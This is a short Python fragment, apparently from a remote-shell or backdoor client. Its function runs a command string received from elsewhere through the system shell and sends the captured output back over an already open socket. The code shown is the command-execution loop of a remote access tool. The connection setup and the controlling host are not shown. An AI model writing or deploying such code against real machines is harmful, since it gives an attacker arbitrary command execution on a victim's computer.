def basic(): 
    command = sb.Popen(raw, stdout=sb.PIPE, stderr=sb.PIPE, stdin=sb.PIPE, shell=True)
    out = command.stdout.read() + command.stderr.read()
    if out == b'':
        s.sendall(("action complete. nothing to print.").encode("UTF-8"))
    else:
        lenout = str(len(out))
        s.sendall((lenout.encode('UTF-8')))
        time.sleep(0.1)
        s.sendall(out)